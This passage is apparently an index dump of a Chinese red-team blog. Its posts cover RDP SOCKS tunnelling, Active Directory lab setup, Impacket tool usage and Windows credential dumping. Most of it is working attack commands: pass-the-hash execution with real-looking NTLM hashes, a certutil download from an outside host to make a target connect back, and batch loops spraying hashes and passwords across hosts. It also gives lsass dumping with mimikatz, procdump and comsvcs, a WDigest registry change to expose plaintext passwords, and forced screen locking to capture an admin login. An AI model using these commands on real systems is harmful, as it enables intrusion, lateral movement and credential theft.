连接进行通信，而无需在防火墙上打开新的套接字、连接或端口。此工具在 RDP 协议的基础上实现了 SOCKS 代理功能，就像 SSH 的 -D 参数一样，在建立远程连接后，即可利用 RDP 协议实现代理功能。\n该工具分为服务端和客户端\n 第一部分是一个 .dll 文件，需要在 RDP 连接的客户端上进行注册，并在每次运行时将其加载到远程桌面客户端 mstsc 的上下文运行环境中。 第二部分是一个 .exe 可执行文件，它是服务端组件，需要上传到 RDP 连接的服务器并执行。  工具原理：\n当 SocksOverRDP-Plugin.dll 在 RDP 客户端上被正确注册后，每次启动远程桌面时都会由 mstsc 加载。接着，当 SocksOverRDP-Server.exe 被上传到 RDP 服务端上传并执行后 ，SocksOverRDP-Server.exe 会在动态虚拟通道上回连 SocksOverRDP-Plugin.dll，这是远程桌面协议的一个功能。虚拟通道设置完成后，SOCKS 代理将在 RDP 客户端计算机上启动，默认为 127.0.0.1:1080。此服务可用作任何浏览器或工具的 SOCKS5 代理。并且服务器上的程序不需要服务器端的任何特殊特权，还允许低特权用户打开虚拟通道并通过连接进行代理。\n通过 SocksOverRDP 搭建 SOCKS5 代理 测试环境如下：\n客户端 在攻击中对 SocksOverRDP-Plugin.dll 进行安装注册\n\rregsvr32.exe SocksOverRDP-Plugin.dll # 注册\r# regsvr32.exe /u SocksOverRDP-Plugin.dll 取消注册\r 如上图所示，注册成功。但是由于 SocksOverRDP 建立的 SOCKS5 代理是默认监听在 127.0.0.1:1080 上的，所以只能从攻击机本地使用，为了让攻击者的 Kali 也能使用搭建在攻击机 Windows 10 上的 SOCKS5 代理，我们需要修改其注册表，将 IP 从 127.0.0.1 改为 0.0.0.0。注册表的位置为：\nHKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Terminal Server Client\\Default\\AddIns\\SocksOverRDP-Plugin\r 可以下载源代码，将127.0.0.1改成0.0.0.0\n通过攻击机启动mstsc.exe，连接目标主机\n服务端 弹出了一个提示说 SocksOverRDP 成功启动，当服务端的可执行文件运行后即可在攻击机的 1080 端口上启动 SOCKS5 代理服务。\n在攻击机上，可以发现1080端口已经成功建立连接。\n使用Proxifier建立代理\n","id":35,"section":"posts","summary":"SocksOverRDP 项目地址：https://github.com/nccgroup/SocksOverRDP SocksOverRDP 可以将 SOCKS 代理的功能添加到远程桌面服务，它使用动","tags":["端口复用","内网渗透"],"title":"利用RDP协议搭建Socks5代理隧道","uri":"https://ad-calcium.github.io/2021/09/%E5%88%A9%E7%94%A8-rdp-%E5%8D%8F%E8%AE%AE%E6%90%AD%E5%BB%BA-socks5-%E4%BB%A3%E7%90%86%E9%9A%A7%E9%81%93/","year":"2021"},{"content":"一、AD CS的功能  证书颁发机构（CA）：可以向用户、机构和服务颁发证书。 CA WEB注册：用户可以通过web浏览器申请证书。 联机响应程序服务：联机响应程序服务通过对特定证书的吊销状态申请进行解码，评估这些证书的状态，并发送回包含所申请证书状态信息的签名响应来实现联机证书状态协议 (OCSP)。 网络设备注册服务：网络设备注册服务可根据 Cisco Systems Inc. 提供的简单证书注册协议 (SCEP) 允许路由器和其他网络设备获取证书。  二、安装AD CS证书 在服务器管理器中 ，点击添加角色和功能，下一步\n 选基于角色或基于功能的安装，下一步\n选择要安装角色或功能的服务器，服务器池中只有本机，下一步\n选择要安装的角色，选中Active Directory 证书服务，添加功能\n选择角色对应的功能，默认即可，下一步\n安装证书服务，下一步\n安装角色服务\n确认安装\n 安装完成\n点击蓝色的配置目标服务器…\n点击”配置目标服务器上的Active Directory证书服务”，出现配置向导窗口\n配置角色服务\n指定CA的设置类型\n指定私钥类型指定私钥类型\n指定加密选项\n指定CA名称\n指定有效期\n指定CA数据库位置\n进行确认和配置\n配置证书模板\n激活证书服务\n激活证书服务\nhttps://127.0.0.1/certsrv 输入域用户名密码\n","id":36,"section":"posts","summary":"一、AD CS的功能 证书颁发机构（CA）：可以向用户、机构和服务颁发证书。 CA WEB注册：用户可以通过web浏览器申请证书。 联机响应程序服务：联","tags":["内网环境搭建"],"title":"Windows server 2012 AD CA证书服务搭建","uri":"https://ad-calcium.github.io/2021/09/windows-server-2012-ad-ca%E8%AF%81%E4%B9%A6%E6%9C%8D%E5%8A%A1%E6%90%AD%E5%BB%BA/","year":"2021"},{"content":"1. 安装域控 一、准备工作 首先准备1台比较干净的服务器，推荐使用 Windows Server 2012 R2，使用别的服务器可能会出现问题。\n二、修改主机名 三、安装域 打开服务器管理器，添加角色和功能。\n出现“添加角色和功能”界面，下一步 。\n根据提示操作，下一步。\n根据提示操作，下一步。\n选择添加AD域服务（Active Directory 域服务），同时添加所需功能。\n根据提示操作，下一步\n根据提示操作，下一步\n根据提示操作，安装\n等待安装完成\n安装完成\n四、配置域 点击服务器管理器左侧“AD DS” 、点击黄色提示部分中的更多。\n进入AD域服务器配置向导，选择 “添加新林” ，输入域，点击下一步。\n填写密码，下一步 。\n提示DNS无法创建，不用管，继续下一步\n根据提示操作，下一步\n安装路径，默认，下一步\n查看选项，默认，下一步\n点击安装 。此过程可能会报错，提示登陆用户没有设置密码，去设置给当前登陆用户（Administrator）设置一个密码，然后回来点击 “重新运行先决条件检查” 即可！\n安装完成，会提示注销重启 （此过程比较漫长，耐心等待）\n2. 辅域控制器的安装方法 一、准备工作 在DC中处新建一个用户和安全组，针对安全组来设置权限（SecurityGroup），在之后的操作中都使用该用来来操作\n添加相应角色\n在DC2中设置DNS，首选 DNS 指向第一台域控，备用填写自己的 IP\n二、修改主机名 三、安装域 打开服务器管理器，添加角色和功能。\n出现“添加角色和功能”界面，下一步 。\n根据提示操作，下一步。\n根据提示操作，下一步。\n选择添加AD域服务（Active Directory 域服务），同时添加所需功能。\n根据提示操作，下一步\n根据提示操作，下一步\n根据提示操作，安装\n等待安装完成\n安装完成\n四、配置辅域 按照下图选择\n填写刚才新建具有权限的用户，不使用默认的administrator\n选择域，确定\n完成域确认后，下一步\n保持默认，填写还原模式密码\n下一步\n选择dc01（由于测试环境，没有任何数据，此处不需要“从介质安装”，多站点，数据库文件大时，使用该项）\n默认路径，下一步\n下一步\n安装\n安装完成后，重启\n登录\n安装后用户和计算机、站点和服务中，都看到了二台域控制器。\n到些主辅二台域控制器搭建完成\n","id":37,"section":"posts","summary":"1. 安装域控 一、准备工作 首先准备1台比较干净的服务器，推荐使用 Windows Server 2012 R2，使用别的服务器可能会出现问题。 二、修改主机名 三、安装域 打开服务器管理","tags":["内网环境搭建"],"title":"Windows Server 2012 R2安装域控制器和辅域","uri":"https://ad-calcium.github.io/2021/09/windows-server-2012-r2%E5%AE%89%E8%A3%85%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E5%92%8C%E8%BE%85%E5%9F%9F/","year":"2021"},{"content":"0x00 前言 Impacket官方介绍为用于处理网络协议的Python类的集合，该集合包含了渗透测试中常见的工具种类，包括远程命令执行、信息收集、票据传递、凭据获取、中间人攻击测试等。该套件里的工具使用也是linux主机跳向windows主机的方式之一。\n0x01 介绍 Impacket中包含以下协议  以太网，Linux“ Cooked”捕获。 IP，TCP，UDP，ICMP，IGMP，ARP。 IPv4和IPv6支持。 NMB和SMB1，SMB2和SMB3（高级实现）。 MSRPC版本5，通过不同的传输方式：TCP，SMB / TCP，SMB / NetBIOS和HTTP。 使用密码/哈希/票证/密钥的普通，NTLM和Kerberos身份验证。 以下MSRPC接口的部分/完全实现：EPM，DTYPE，LSAD，LSAT，NRPC，RRP，SAMR，SRVS，WKST，SCMR，DCOM，WMI TDS（MSSQL）和LDAP协议实现的部分。  Impacket中包含以下工具 远程执行  psexec.py：使用RemComSvc的PSEXEC类似功能示例。 smbexec.py：一种与使用RemComSvc的PSEXEC。我们的实现更进一步，实例化一个本地smbserver来接收命令的输出。这在目标计算机没有可用的可写共享的情况下很有用。 atexec.py：此示例通过Task Scheduler服务在目标计算机上执行命令，并返回已执行命令的输出。 wmiexec.py：半交互式外壳，通过Windows Management Instrumentation使用。不需要在目标服务器上安装任何服务/代理。以管理员身份运行。高度隐秘。（可使用NTLM_hash登录） dcomexec.py：与wmiexec.py类似的半交互外壳，但使用不同的DCOM端点。当前支持MMC20.Application，ShellWindows和ShellBrowserWindow对象。  Kerberos  GetTGT.py：给定密码，哈希或aesKey，此脚本将请求TGT并将其保存为ccache。 GetST.py：在ccache中输入密码，哈希，aesKey或TGT后，此脚本将请求服务票证并将其另存为ccache。如果该帐户具有受约束的委派（具有协议转换）权限，则可以使用-impersonate开关代表另一个用户请求票证。 GetPac.py：该脚本将仅具有经过身份验证的普通用户凭据，获取指定目标用户的PAC（特权属性证书）结构。通过混合使用MS-SFU]的S4USelf +用户到用户Kerberos身份验证来实现。 GetUserSPNs.py：此示例将尝试查找和获取与普通用户帐户关联的服务主体名称。输出与JtR和HashCat兼容。 GetNPUsers.py：此示例将尝试为那些设置了属性“不需要Kerberos预身份验证”（UF_DONT_REQUIRE_PREAUTH）的用户列出并获取TGT。输出与JtR兼容。 ticketer.py：此脚本将从头开始或基于模板（从KDC合法请求）创建Golden / Silver票证，允许您自定义PAC_LOGON_INFO结构内设置的某些参数，尤其是组，ExtraSid，持续时间等。 raiseChild.py：该脚本通过（ab）使用Golden Tickets和ExtraSids的概念来实现子域到森林特权的升级。  Windows的秘诀  secretsdump.py：执行各种技术以从远程计算机中转储秘密，而无需在该计算机上执行任何代理。对于SAM和LSA机密（包括缓存的凭据），我们尝试从注册表中读取尽可能多的内容，然后将配置单元保存在目标系统（％SYSTEMROOT％\\ Temp目录）中，并从那里读取其余数据。对于DIT文件，我们使用DL_DRSGetNCChanges（）方法转储NTLM哈希，纯文本凭据（如果可用）和Kerberos密钥。它还可以通过使用smbexec / wmiexec方法执行的vssadmin转储NTDS.dit。如果脚本不可用，该脚本将启动其工作所需的服务（例如，即使已禁用，也应使用“远程注册表”）。工作完成后，一切恢复到原始状态。 mimikatz.py：迷你外壳，用于控制由@gentilkiwi开发的远程mimikatz RPC服务器。  服务器工具/ MiTM攻击  ntlmrelayx.py：此脚本执行NTLM中继攻击，设置SMB和HTTP Server以及将凭据中继到许多不同的协议（SMB，HTTP，MSSQL，LDAP，IMAP，POP3等）。该脚本可以与预定义的攻击一起使用，这些预定义的攻击可以在中继连接时触发（例如，通过LDAP创建用户），或者可以以SOCKS模式执行。在这种模式下，对于每个中继的连接，以后可以通过SOCKS代理多次使用它。 karmaSMB.py：不管指定的SMB共享和路径名如何，均可响应karmaSMB.py)特定文件内容的SMB服务器。 smbserver.py：服务器的Python实现。允许快速设置共享和用户帐户。  WMI  wmiquery.py：它允许发出WQL查询并获得目标系统上WMI对象的描述（例如，从win32_account中选择名称）。 wmipersist.py：此脚本创建/删除WMI事件使用者/过滤器，并在两者之间建立链接，以基于指定的WQL过滤器或计时器执行Visual Basic。  已知漏洞  goldenPac.py：针对MS14-068的漏洞利用。保存黄金票，并在目标上启动PSEXEC会话。 sambaPipe.py：此脚本将利用CVE-2017-7494，上载并执行用户通过-so参数指定的共享库。 smbrelayx.py：使用SMB中继攻击来利用CVE-2015-0005。如果目标系统正在执行签名并且提供了计算机帐户，则模块将尝试通过NETLOGON收集SMB会话密钥。  SMB / MSRPC  smbclient.py：一个通用的SMB客户端，可让您使用用户名和密码或用户名和哈希值的组合列出共享和文件，重命名，上传和下载文件以及创建和删除目录。这是了解如何在实际中使用impacket.smb的绝佳示例。 getArch.py ：此脚本将连接到目标机器（或目标列表），并使用记录在案的MSRPC功能收集由（ab）安装的OS体系结构类型。 rpcdump.py：此脚本将转储在目标处注册的RPC终结点和字符串绑定的列表。它还将尝试将它们与知名端点列表匹配。 ifmap.py：此脚本将绑定到目标的MGMT接口以获取接口ID的列表。它将在野外看到的试图绑定到每个接口的另一个接口UUID列表的顶部使用该列表，并报告该接口是否已列出和/或正在侦听。 opdump.py：这绑定到给定的主机名：端口和MSRPC接口。然后，它尝试依次调用前256个操作号中的每个操作号，并报告每个调用的结果。 samrdump.py：一种与MSRPC套件中的“安全帐户管理器”远程接口进行通信的应用程序。它列出了系统用户帐户，可用资源份额以及通过此服务导出的其他敏感信息。 services.py：此脚本可用于通过MS-SCMR] MSRPC接口来操作Windows服务。它支持开始，停止，删除，状态，配置，列表，创建和更改。 netview.py：获取在远程主机上打开的会话的列表，并跟踪它们在找到的主机上循环，并跟踪谁从远程服务器登录/注销 reg.py：通过MS-RRP] MSRPC接口的远程注册表操作工具。这个想法是提供与REG.py Windows实用程序类似的功能。 lookupsid.py：通过MS-LSAT] MSRPC接口的Windows SID暴力实例，旨在查找远程用户/组。  MSSQL / TDS  mssqlinstance.py：从目标主机检索MSSQL实例名称。 mssqlclient.py：一个MSSQL客户端，支持SQL和Windows身份验证（也有哈希）。它还支持TLS。  档案格式  esentutl.py：一种Extensibe Storage Engine格式的实现。允许转储ESE数据库的目录，页面和表（例如NTDS.dit） ntfs-read.py：NTFS格式的实现。该脚本提供了一个迷你外壳，用于浏览和提取NTFS卷，包括隐藏/锁定的内容。 registry-read.py：一个Windwows注册表文件格式实现。它允许解析脱机注册表配置单元。  其他  GetADUsers.py：此脚本将收集有关域用户及其对应电子邮件地址的数据。它还将包含有关上次登录和上次密码设置属性的一些额外信息。 mqtt_check.py：简单的MQTT示例，旨在使用不同的登录选项。可以很容易地转换为帐户/密码蛮力。 rdp_check.py：MS-RDPBCGR和MS-CREDSSP]部分实现只是为了达到CredSSP身份验证。本示例测试帐户在目标主机上是否有效。 sniff.py：简单的数据包嗅探器，它使用pcapy库来侦听＃通过指定接口传输的数据包。 sniffer.py：简单的数据包嗅探器，它使用原始套接字侦听与指定协议相对应的传输中的数据包。 ping.py：使用ICMP回显和回显应答包检查主机状态的简单ICMP ping。如果远程主机已启动，则它应使用echo-r eply数据包回复echo探测。 ping6.py：使用ICMP回显和回显应答包检查主机状态的简单IPv6 ICMP ping。  0x02 基本使用 psexec psexec.py始于微软的pstools套件， 用于管理员远程管理windows主机资产，在渗透测试中也经常用来对远程计算机执行命令。\n与微软官方的psexec.py做对比，官方psexec.py执行远程命令会在远程主机创建一个PSEXEC的服务，并且命令执行后会一直存在，容易被管理人员发现并判断有入侵行为。impacket套件内的psexec，执行命令之后会删除对应的服务，隐蔽性更佳，而且impacket套件内的psexec支持PTH(哈希传递)。\n与官方psexec相同，impacket套件内的psexec也支持\u0026quot;-c\u0026quot;参数，参数解释如下，即复制本地可执行文件到远程主机并执行\n本地账号密码认证 python3 psexec.py ./administrator:123456@10.10.10.120\r 在psexec执行过程中，在远程主机10.10.10.120查看服务，发现创建了一个fZWPvIyH.py的服务\nNTLM HASH认证 python3 psexec.py -hashes :32ed87bdb5fdc5e9cba88547376818d4 ./administrator@10.10.10.120\r 域管账号密码认证 python3 psexec.py adlab/administrator:123456@10.10.10.250\r 域内使用NTLM hash认证对远程主机 python3 psexec.py -hashes :32ed87bdb5fdc5e9cba88547376818d4 adlab/administrator@10.10.10.250\r 远程加载可执行程序 下面使用\u0026quot;-c\u0026quot;参数远程加载可执行程序，使目标主机反向回连。artifact.exe放到与psexec.py相同目录。\npython3 psexec.py ./administrator:123456@10.10.10.120 -c artifact.exe\r 如下图，目标主机已正常回连，由于目标主机是双网卡主机，显示内网ip为另外一块网卡的ip。\nsmbexe smbexe为全交互式工具，所以不可用于webshell环境，可用于rdp等有交互环境登录使用或socks代理环境下使用。\n本地账号密码认证 python3 smbexec.py ./administrator:123456@10.10.10.120\r NTLM hash认证 python3 smbexec.py -hashes :32ed87bdb5fdc5e9cba88547376818d4 ./administrator@10.10.10.120\r 域管账号密码认证 python3 smbexec.py adlab/administrator:123456@10.10.10.250\r 域内使用NTLM hash认证对远程主机 python3 smbexec.py -hashes :32ed87bdb5fdc5e9cba88547376818d4 adlab/administrator@10.10.10.250\r smbclient.py 有时候，我们需要在攻击者计算机和目标计算机之间执行多项操作，那么 s mbclien.py 足够满足我们的所需，它可以列出共享和文件，重命名某些文 件，上传二进制文件或从目标计算机下载文件。\n句法： smbclient.py 域] / 用户]：密码/密码哈希] @ 目标 IP 地址]\n本地账号验证 python3 smbclient.py ./Administrator:123456@10.10.10.120\ruse c$\rput c:\\xxxx.exe 上传\rget xxx.exe c盘的相对路径，下载到当前文件夹内\r 成功上传到C盘\n下载\nNTLM HASH进行验证 python3 smbclient.py -hashes :32ed87bdb5fdc5e9cba88547376818d4 ./administrator@10.10.10.120\r 我们将连接到目标计算机，并且我们有了一个 smb shell，它可以运行各 种命令，例如 dir，cd，pwd，put，rename，更多，del，rm，mkdir，rmdir， 信息等\natexec atexec是通过windows计划任务执行远程命令，atexec是一个半交互的工具，即参数中添加需要在远程主机执行的命令，工具执行后即返回命令结果，适用于webshell下，也适用于其他网络环境。\n本地账号密码认证 python3 atexec.py ./administrator:123456@10.10.10.120 \u0026quot;whoami\u0026quot;\r NTLM hash认证 python3 atexec.py -hashes :32ed87bdb5fdc5e9cba88547376818d4 ./administrator@10.10.10.120 \u0026quot;whoami\u0026quot;\r 域管帐户密码认证 python3 atexec.py adlab/administrator:123456@10.10.10.120 \u0026quot;certutil -urlcache -split -f http://10x.xx.xx.x7:8080/lib8.py\u0026quot;  在linux主机下，使用proxychains代理工具，使用atexec远程执行该程序，使主机反向回连 *注意此处，123456密码中的\u0026quot;!\u0026ldquo;需要转义，否则会报错。*\nproxychains python3 atexec.py adlab/administrator:admin\\!@#45@10.10.10.120 \u0026quot;lib8.py\u0026quot;\r 域内使用NTLM hash认证对远程主机 python3 atexec.py -hashes :32ed87bdb5fdc5e9cba88547376818d4 adlab/administrator@10.10.10.120 \u0026quot;whoami\u0026quot;\r 由此可以写一些简单bat脚本，如批量对内网机器遍历做hash传递验证、指定主机ntlm hash遍历验证、内网机器遍历做密码验证、指定主机密码遍历验证。\n内网机器遍历做hash传递验证,ips.txt内容为内网ip，每段一条 FOR /F %%i in (ips.txt) do atexec.py -hashes :DF92E298362E3E180EC0EE7226AFB821 ./administrator@%%i whoami 指定主机ntlm hash遍历验证，hashes.txt为已知ntlm hash内容，每段一条\rFOR /F %%i in (hashes.txt) do atexec.py -hashes %%i ./administrator@10.10.10.120 whoami 内网机器遍历做密码验证，passwords.txt为已知密码内容，每段一条\rFOR /F %%i in (passwords.txt) do atexec.py ./administrator:%%i@10.10.10.120 whoami 指定主机密码遍历验证,ips.txt内容为内网ip，每段一条\rFOR /F %%i in (ips.txt) do atexec.py ./administrator:password123@%%i whoami  wmiexec wmiexec是一个即有全交互也有半交互的远程命令执行工具，可运用于多种环境，包括webshell环境、rdp环境、socks环境等。\n本地账号密码认证 python3 wmiexec.py adlab/administrator:123456@10.10.10.120\r NTLM HASH认证 python3 wmiexec.py -hashes :32ed87bdb5fdc5e9cba88547376818d4 ./administrator@10.10.10.120\r 在linux主机下，使用proxychains代理工具，使用wmiexec对远程主机10.10.10.120执行命令\npython3 wmiexec.py adlab/administrator:admin\\!@#45@10.10.10.120\r dcomexec 此方式通过dcom远程管理组件来执行，此种方式走DCOM的135端口执行，445端口UNC取回。但如果目标445端口被防火墙过滤就会导致远程命令执行失败。\npython3 dcomexec.py ./administrator:123456@10.10.10.53\r 后续发现有一个参数叫-nooutput就可以解决这样的情况，这时wmiexec、dcomexec仅仅会使用135端口，但是不会有回显。有些时候很有必要把debug打开。\nSamrdump.py 与MSRPC套件中的安全帐户管理器远程接口通信的应用程序。它将为我们列出目标系统上的用户帐户，可用资源共享以及通过此服务导出的其他敏感信息\n语法: ./samrdump.py domain/] username : password] @] Target IP Address]\npython3 samrdump.py ./Administrator:123456@10.10.10.120\r getST 在ccache中输入密码，哈希，aesKey或TGT后，此脚本将请求服务票证并将其另存为ccache。如果该帐户具有受约束的委派（具有协议转换）权限，则可以使用-impersonate开关代表另一个用户请求票证。\npython3 getST.py -spn cifs/liming-pc.adlaboffice.com -impersonate administrator -dc-ip 192.168.10.50 adlaboffice.com/evilcomputer$:123456\r secretsdump 执行各种技术以从远程计算机中转储秘密，而无需在该计算机上执行任何代理。对于SAM和LSA机密（包括缓存的凭据），我们尝试从注册表中读取尽可能多的内容，然后将配置单元保存在目标系统（％SYSTEMROOT％\\ Temp目录）中，并从那里读取其余数据。对于DIT文件，我们使用DL_DRSGetNCChanges（）方法转储NTLM哈希，纯文本凭据（如果可用）和Kerberos密钥。它还可以通过使用smbexec / wmiexec方法执行的vssadmin转储NTDS.dit。如果脚本不可用，该脚本将启动其工作所需的服务（例如，即使已禁用，也应使用“远程注册表”）。工作完成后，一切恢复到原始状态。\npython3 secretsdump.py -sam sam.hiv -security security.hiv -system system.hiv LOCAL\r mssqlclient 一个MSSQL客户端，支持SQL和Windows身份验证（也有哈希）\nwindows认证 python3 mssqlclient.py ./administrator:123456@10.108.3.132 -windows-auth\r mssql账号密码认证的服务 python3 mssqlclient.py sa:123456@10.108.3.132\renable_xp_cmdshell 开启xpcmdshell\rxp_cmdshell whoami 执行命令\rupload c:\\shell.exe c:\\windows\\temp\\shell.exe\rupload 本地目录 远程目录\r 在windows环境下使用windows认证模式，使用ntlm hash验证方式，mssqlclient测试登录sqlserver服务器，账号验证成功后执行command.txt内的sql命令\npython3 mssqlclient.py -p 1433 -hashes :dsfhsajfdsjbfsdfrootkit/sqladmin@192.168.3.73 -file command.txt -windows-auth\r 验证成功后执行mssql.txt内的sql语句\npython3 mssqlclient.py domain/administrator@192.168.159.138 -windows-auth -file mssql.txt\r services.py Impacket 的服务脚本在 MSRPC Interface 的帮助下与 Windows 服务进行通 信。它可以启动，停止，删除，读取状态，配置，列出，创建和更改任何服务。\n句法： services.py 域] / 用户]：密码/密码哈希] @ 目标 IP 地址] 操 作]\n本地账号验证 python3 services.py Administrator:123456@10.10.10.120 list\r NTLM HASH进行验证 python3 services.py -hashes :32ed87bdb5fdc5e9cba88547376818d4 ./Administrator@10.10.10.120 list\r opdump.py 该脚本绑定到给定的主机名：端口，并连接到 DCERPC（分布式计算环境/ 远程过程调用）接口。连接后，它将尝试依次调用前 256 个操作号中的每个操 作号，并报告每次调用的结果，这会生成与给定 host：port 的 TCP 连接信息。\n句法： opdump.py 目标 IP 地址] 端口接口版本]\npython3 opdump.py 10.10.10.120 135 76F226C3-EC14-4325-8A99- 6A46348418AF v1.0\r rpcdump.py RPC 或远程过程调用是指计算机程序使过程在不同的地址空间中执行时 （被编码为常规过程调用）。该脚本可以为我们枚举这些端点。\n句法： rpcdump.py 域] / 用户]：密码/密码哈希] @ 目标 IP 地址]\n本地账号验证 python3 rpcdump.py adlab/Administrator:123456@10.10.10.250\r NTLM HASH进行验证 python3 rpcdump.py -hashes :32196B56FFE6F45E294117B91A83BF38 adlab/Administrator@10.10.10.250\r lookupsid 安全标识符（SID）是可变长度的唯一值，用于标识用户帐户，通过 SID 用 户枚举，我们可以提取有关存在的用户及其数据的信息，Lookupsid 脚本可以 枚举本地和域用户。\n句法： lookupsid.py 域] / 用户]：密码/密码哈希] @ 目标 IP 地址]\n本地账号验证 python3 lookupsid.py adlab/Administrator:123456@10.10.10.250  NTLM HASH进行验证 python3 lookupsid.py -hashes :32ed87bdb5fdc5e9cba88547376818d4 adlab/Administrator@10.10.10.250\r ","id":38,"section":"posts","summary":"0x00 前言 Impacket官方介绍为用于处理网络协议的Python类的集合，该集合包含了渗透测试中常见的工具种类，包括远程命令执行、信息收集、票","tags":["内网渗透","横向移动"],"title":"impacket套件使用","uri":"https://ad-calcium.github.io/2021/09/impacket%E5%A5%97%E4%BB%B6%E7%9A%84%E4%BD%BF%E7%94%A8/","year":"2021"},{"content":"0×00 前言 市面上可见到的读Windows本地密码的大多工具都是变则法子的去读lsass.exe这个密码的内存或者SAM数据库，然后从里面提取hash。所以有杀软的情况下读密码这事根本就不是工具免不免杀的问题，而是杀软有没有监控保护lsass.exe或SAM的问题，所以读本地密码条件可以总结为：\n 能正常访访问lsass.exe内存或SAM数据库。\n 0x02 工具下载地址 https://github.com/gentilkiwi/mimikatz/releases\r 0x3 实验 一、获取本地帐户密码 1.本地执行 右键以管理员方式运行cmd在当前终端中运行mimikatz.exe：\n#提升权限\rprivilege::debug\r#抓取密码\rsekurlsa::logonpasswords\r 当目标为 win10 或 2012R2 以上时，默认在内存缓存中禁止保存明文密码，但可以通过修改注册表的方式抓取明文。\ncmd 修改注册表命令：\n#重启或用户重新登录后可以成功抓取\rreg add HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\SecurityProviders\\\\WDigest /v UseLogonCredential /t REG\\_DWORD /d 1 /f\r 2.SAM 表获取 hash #导出SAM数据\rreg save hklm\\sam sam.hive\rreg save hklm\\system system.hive\r#使用mimikatz提取hash\rmimikatz.exe \u0026quot;lsadump::sam /sam:sam.hive /system:system.hive\u0026quot; exit\r 3.laZagne laZagne_x64.exe windows\r 二、lsass内存dump 通过以下操作可先获取到lsass内存文件，然后使用mimikatz可进一步读取密码\nmimikatz.exe \u0026quot;sekurlsa::minidump lsass.dmp\u0026quot; \u0026quot;sekurlsa::logonPasswords full\u0026quot; exit\r 1.procdump64 当 mimikatz 无法在主机上运行时，可以使用微软官方发布的工具 Procdump 导出 lsass.exe:\nprocdump64.exe -accepteula -ma lsass.exe lsass.dmp\r 2.createminidump createminidump.exe\r 3.SqlDumper for /f \u0026quot;tokens=2\u0026quot; %i in ('tasklist /FI \u0026quot;IMAGENAME eq lsass.exe\u0026quot; /NH') do Sqldumper.exe %i 0 0x01100\r 4.powershell for /f \u0026quot;tokens=2\u0026quot; %i in ('tasklist /FI \u0026quot;IMAGENAME eq lsass.exe\u0026quot; /NH') do powershell -c \u0026quot;rundll32 C:\\windows\\system32\\comsvcs.dll, MiniDump %i C:\\lsass.dmp full\u0026quot;\r 5.rdrleakdiag rdrleakdiag.exe转储的新方法\n默认存在的系统：\nWindows 10 Windows 8.1 Windows 8 Windows7 windows Vista 软件版本 10.0.15063.0 6.3.9600.17415 6.2.9200.16384 6.1.7600.16385 6.0.6001.18000 另外有师傅测试2008没有该exe文件，2016存在。没有的情况可以选择传一个上去。\n使用方法\nfor /f \u0026quot;tokens=2\u0026quot; %i in ('tasklist /FI \u0026quot;IMAGENAME eq lsass.exe\u0026quot; /NH') do rdrleakdiag.exe /p %i /o c:\\users\\ /fullmemdmp /wait 1\r 会产生两个文件，results_+进程pid+.hlk，minidump_+进程pid+.dmp。\n6.wce wce.exe -w 读取系统明文密码\rwme.exe -l 获取hash\r 7.PwDump7 PwDump7.exe\r 8.SharpDump 地址：https://github.com/GhostPack/SharpDump\nSharpDump.exe\r 9.AvDump工具 Avdump.exe 是Avast Home Security 产品套件一起提供的小工具。顾名思义，该实用程序将给定进程标识符的内存转储到用户指定的位置。我们可以通过它进行新的 dump 方式利用。\n从https://www.pconlife.com/viewfileinfo/avdump-exe/ 下载该程序。需要在powershell环境下运行该程序，测试cmd环境下无法导出：\ntasklist | findstr /i lsass.exe\r .\\AvDump.exe --pid 684 --exception_ptr 0 --dump_level 1 --thread_id 0 --min_interval 0 --dump_file c:\\lsass.dmp\r 解密\n将 lsass.dmp 下载到本地后，然后执行 mimikatz:\nmimikatz.exe \u0026quot;sekurlsa::minidump lsass.dmp\u0026quot; \u0026quot;sekurlsa::logonPasswords full\u0026quot; exit\r 为了方便复制与查看，可以输出到本地文件里面：\nmimikatz.exe \u0026quot;sekurlsa::minidump lsass.dmp\u0026quot; \u0026quot;sekurlsa::logonPasswords full\u0026quot; \u0026gt; pssword.txt\r KB2871997补丁 在 KB2871997 之前， Mimikatz 可以直接抓取明文密码。\n当服务器安装 KB2871997 补丁后，系统默认禁用 Wdigest Auth ，内存（lsass进程）不再保存明文口令。Mimikatz 将读不到密码明文。 但由于一些系统服务需要用到 Wdigest Auth，所以该选项是可以手动开启的。（开启后，需要用户重新登录才能生效）\n原理：获取到内存文件lsass.exe进程(它用于本地安全和登陆策略)中存储的明文登录密码\n利用前提：拿到了admin权限的cmd，管理员用密码登录机器，并运行了lsass.exe进程，把密码保存在内存文件lsass进程中。\n抓取明文：手工修改注册表 + 强制锁屏 + 等待目标系统管理员重新登录 = 截取明文密码\n在默认情况下，当系统为win10或2012R2以上时，默认在内存缓存中禁止保存明文密码，密码字段显示为null，此时可以通过以下方式开启，但需要用户重新登录后才能成功抓取。\n开启Wdigest Auth\n  cmd\nreg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f\r   powershell\nSet-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest -Name UseLogonCredential -Type DWORD -Value 1\r   meterpreter\nreg setval -k HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\SecurityProviders\\\\WDigest -v UseLogonCredential -t REG_DWORD -d 1\r   关闭Wdigest Auth\n关闭命令如下：\n  cmd\nreg add HKLMSYSTEMCurrentControlSetControlSecurityProvidersWDigest /v UseLogonCredential /t REG_DWORD /d 0 /f\r   powershell\nSet-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest -Name UseLogonCredential -Type DWORD -Value 0\r   meterpreter\nreg setval -k HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\SecurityProviders\\\\WDigest -v UseLogonCredential -t REG_DWORD -d 0\r   强制锁屏\n在开启 Wdigest Auth 后，需要管理员重新登录才能抓明文密码。\n强制锁屏，让管理员重新登录。\n  cmd\nrundll32 user32.dll,LockWorkStation\r   powershell\nFunction Lock-WorkStation {\r$signature = @\u0026quot;\r[DllImport(\u0026quot;user32.dll\u0026quot;, SetLastError = true)]\rpublic static extern bool LockWorkStation();\r\u0026quot;@\r$LockWorkStation = Add-Type -memberDefinition $signature -name \u0026quot;Win32LockWorkStation\u0026quot; -namespace Win32Functions -passthru\r$LockWorkStation::LockWorkStation() | Out-Null\r}\rLock-WorkStation\r   powershell -c \u0026quot;IEX (New-Object 